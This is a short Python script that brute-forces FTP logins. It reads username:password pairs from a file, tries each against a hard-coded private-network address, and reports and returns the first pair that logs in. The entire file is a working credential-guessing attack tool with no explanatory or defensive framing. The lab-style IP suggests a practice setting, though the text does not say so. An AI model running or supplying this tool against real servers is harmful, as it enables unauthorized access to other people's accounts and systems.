import ftplib

def bruteForce(hostname,passfile):
    passlist=open(passfile,'r')
    for lines in passlist:
        username=lines.split(':')[0]
        password=lines.split(':')[1].strip('\r').strip('\n')
        print("[+]Trying "+str(username)+' AND '+str(password))
        try:
            ftp=ftplib.FTP(hostname)
            ftp.login(username,password)
            print("[+]FTP Login Succesful with "+str(username)+' AND '+str(password))
            ftp.quit()
            return (username,password)
        except Exception:
            pass

if __name__=='__main__':
    passfile='password'
    hostname='192.168.0.133'
    bruteForce(hostname,passfile)